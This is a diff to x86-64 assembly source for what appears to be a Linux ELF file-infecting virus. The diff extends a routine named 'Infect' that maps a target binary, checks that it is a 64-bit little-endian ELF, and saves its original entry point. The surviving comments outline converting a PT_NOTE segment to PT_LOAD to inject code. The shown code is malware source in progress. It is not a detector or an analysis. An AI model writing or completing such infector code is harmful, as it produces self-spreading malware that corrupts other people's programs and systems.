@@ -9,8 +9,7 @@
 ;       variables and macros. Jokes aside, for this I wanted
 ;       to experiment by approaching ASM like an high-level
 ;       language, thus making it *hopefully* more readable
-;       for people unfamiliar with ASM. Different Source 
-;       Files may be treated as namespaces.
+;       for people unfamiliar with ASM.
 
 %include "src/Macros.asm"
 %include "src/Structs.asm"
@@ -134,10 +133,28 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   test    rax,  rax                   ; check if mmap(...) failed
   js      .InfectExit
 
-  push    rax                         ; rsp       -> FileMap
-                                      ; rsp + 0x8 -> FileSz
+  push    rax                         ; rsp         -> FileMap (ELF-HDR)
+                                      ; rsp + 0x8   -> FileSz
+                                      ; rsp + 0x10  -> Old Entry
+                                      ; rsp + 0x18  -> ???
+                                      ; rsp + 0x20  -> ???
 
   ;; SAVE OLD ENTRY >-------------------------------------------------------<
+  
+  ; check 64bit
+  movzx   rbx,  byte [rax + 4]
+  cmp     rbx,  ELF_64BIT
+  jne     .InfectCleanUp
+
+  ; check little endian
+  movzx   rbx,  byte [rax + 5]
+  cmp     rbx,  ELF_LENDIAN
+  jne     .InfectCleanUp
+
+  ; save entry
+  mov     rax,  [rax + elf64_hdr.e_entry]
+  mov     [rsp + 0x10], rax
+
   ;; LOOP THROUGH PHDR >----------------------------------------------------<
   ;;;; IF PH_TYPE == PT_NOTE THEN BREAK >-----------------------------------<
   ;; CONVERT TO PT_LOAD >---------------------------------------------------<
